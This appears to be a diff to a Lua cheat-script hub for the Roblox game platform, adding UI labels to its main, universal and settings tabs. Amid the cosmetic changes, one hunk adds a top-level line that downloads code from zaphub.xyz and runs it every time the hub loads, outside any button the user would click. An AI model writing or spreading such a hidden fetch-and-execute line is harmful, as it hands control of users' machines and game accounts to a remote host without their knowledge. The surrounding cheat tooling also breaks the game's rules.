@@ -131,8 +131,10 @@ local Button = MainTab:CreateButton({
     end,
  })
 
--- Universal
+local Label = MainTab:CreateLabel("Pet Simulator 99")
+loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
 
+-- Universal
 local Label = UniTab:CreateLabel("Any script with a checkmark is verified by @livingtempest7 and is working.")
 local Button = UniTab:CreateButton({
 	Name = " Shizukii Hub",
@@ -156,7 +158,7 @@ local Paragraph = CreditTab:CreateParagraph({Title = "Pre-Release Testers", Cont
 
 -- Settings
 
-
+local Label = SettingTab:CreateLabel("UI Setting")
 local Button = SettingTab:CreateButton({
 	Name = "Reload GUI",
 	Callback = function()
@@ -178,6 +180,7 @@ local Button = SettingTab:CreateButton({
     end,
 })
 
+local Label = SettingTab:CreateLabel("Modifiers")
 local Slider = SettingTab:CreateSlider({
 	Name = "Speed Multiplier",
 	Range = {16, 500},
